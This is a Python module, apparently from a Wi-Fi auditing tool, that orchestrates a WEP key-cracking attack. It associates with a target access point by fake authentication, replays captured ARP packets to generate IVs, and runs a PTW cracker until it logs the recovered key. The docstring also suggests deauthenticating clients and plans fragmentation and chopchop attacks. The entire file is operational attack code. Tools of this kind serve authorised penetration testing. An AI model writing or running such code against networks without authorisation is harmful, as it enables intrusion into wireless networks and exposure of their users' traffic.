"""WEP "Generate IVs" campaign orchestrator.

The single thing the Generate IVs button drives. For M3 it's the two
near-term rungs of the escalation ladder:

    1. fake-auth  — associate so the AP accepts our injections
    2. ARP replay — capture an ARP passively, replay it for fresh IVs

Future milestones extend this: when no ARP turns up, M5/M6 will run
fragmentation / chopchop to *forge* one (pausing replay so only one TX
activity uses the radio at a time), then hand the forged ARP back to replay.
That's why replay lives behind ``pause()``/``resume()`` and the campaign — not
the button — owns the "only one TX activity at once" rule.

Coordination falls out naturally: replay only bursts while fake-auth reports
``associated`` (via the ``can_inject`` gate), so if the AP kicks us mid-replay
the reactive re-auth kicks in, replay goes quiet, and resumes once we're back
in. The loop self-heals.
"""

from __future__ import annotations

import asyncio
import logging
from typing import Callable, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
from wifit3.engine.attacks.wep.arp_replay import WepArpReplay
from wifit3.engine.attacks.wep.crack import (
    PtwCracker,
    keystream_from_arp_cipher,
)

logger = logging.getLogger(__name__)


def _ascii_hint(key: bytes) -> str:
    """Show the ASCII form of a key when it's printable (WEP keys are often a
    word like 'abcde'); otherwise note it's the hex above."""
    if all(0x20 <= b < 0x7F for b in key):
        return f'ASCII "{key.decode("ascii")}"'
    return "hex"


class WepCampaign:
    """Owns the fake-auth + ARP-replay lifecycle for one WEP target."""

    def __init__(
        self,
        iface,
        target: AccessPoint,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self._log = log_callback or (lambda _m: None)
        self._active = False

        # Native PTW cracker, fed incrementally from the collector's crack
        # samples and re-attempted as more IVs arrive. recover() can spend a
        # second or two in the fudge search, so it runs in an executor — never
        # on the UI event loop.
        self.cracker = PtwCracker()
        self.recovered_key: Optional[bytes] = None
        self._crack_cursor = 0
        self._crack_task: Optional[asyncio.Task] = None

        self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
        self.replay = WepArpReplay(
            iface,
            target,
            iface.wep_collector,
            # Replays are re-addressed to come FROM our associated fake-auth STA.
            source_mac=self.fake_auth.source_mac,
            # Only burst while we're actually associated.
            can_inject=lambda: self.fake_auth.state == "associated",
            # Replay traffic keeps the association alive (suppresses the
            # disruptive periodic re-auth) ...
            notify_activity=self.fake_auth.notify_activity,
            # ... and a replay stall asks for an immediate re-auth instead of
            # discarding the (working) seed.
            request_reauth=self.fake_auth.request_reauth,
            log_callback=self._log,
        )

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self._log(
            "[bold cyan]→ Generate IVs[/bold cyan] — fake-auth + ARP replay "
            "starting. Replay holds until associated; deauth a client if no "
            "ARP appears."
        )
        self.fake_auth.start()
        self.replay.start()
        self._crack_task = asyncio.create_task(self._crack_loop())
        logger.info("[WEP-Campaign] Started on %s", self.target.bssid)

    def stop(self) -> None:
        if not self._active:
            return
        self._active = False
        if self._crack_task:
            self._crack_task.cancel()
            self._crack_task = None
        # Stop replay (TX) before fake-auth so we don't briefly inject while
        # de-registering the forged STA.
        self.replay.stop()
        self.fake_auth.stop()
        self._log("[bold red]✗ Generate IVs stopped.[/bold red]")
        logger.info("[WEP-Campaign] Stopped on %s", self.target.bssid)

    async def _crack_loop(self) -> None:
        """Feed new crack samples to the PTW cracker and re-attempt recovery as
        IVs accumulate. The recovery search runs in an executor so a multi-
        second fudge search never stalls the UI."""
        try:
            while self._active and self.recovered_key is None:
                await asyncio.sleep(3.0)
                samples = self.iface.wep_collector.crack_samples(self.target.bssid)
                # Feed only the IVs we haven't fed yet (votes are additive).
                for iv, cipher in samples[self._crack_cursor:]:
                    self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
                self._crack_cursor = len(samples)
                if not self.cracker.ready:
                    continue
                key = await asyncio.get_event_loop().run_in_executor(
                    None, self.cracker.recover
                )
                if key is not None:
                    self.recovered_key = key
                    self._log(
                        f"[bold green]✓ WEP KEY RECOVERED:[/bold green] "
                        f"[bold]{key.hex()}[/bold] "
                        f"[dim]({_ascii_hint(key)})[/dim]"
                    )
                    return
        except asyncio.CancelledError:
            pass

    @property
    def is_active(self) -> bool:
        return self._active
